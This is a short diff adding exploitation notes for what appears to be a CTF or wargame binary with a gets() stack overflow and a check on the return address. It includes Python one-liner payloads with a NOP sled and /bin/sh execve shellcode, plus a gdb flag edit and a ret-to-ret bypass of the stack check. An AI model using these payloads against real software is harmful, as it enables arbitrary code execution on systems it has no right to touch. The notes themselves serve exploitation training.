@@ -1,0 +1,26 @@
+
+=> Analyse binary
+=> main:
+	call p()
+=> p function:
+	- gets(buffer[76])
+	- verify if return address begin is in stacl (begin by 0xb00) then exit
+	- else address point to <main + xx>
+	- then return
+
+-> strategy 1:
+By pass the stack condition:
+
+payload used:
+python -c 'print "A" * 80  + "\x60\xf7\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
+
+- Edit zero flag with gdb 
+ -> break befor jne <+49> and set $eflags &= ~(1 << 6)
+ -> continue and see if programm is exec
+ 
+- Edit the main return addr and let clean the p return addr
+
+return p() address: 0x0804854a
+return main address: 0xb7e454d3
+
+python -c 'print "\x90"*76 + "\x58\xf7\xff\xbf\x4a\x85\x04\x08\x50\x85\x04\x08" + "A"*8 + "\x70\xf7\xff\xbf"  + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
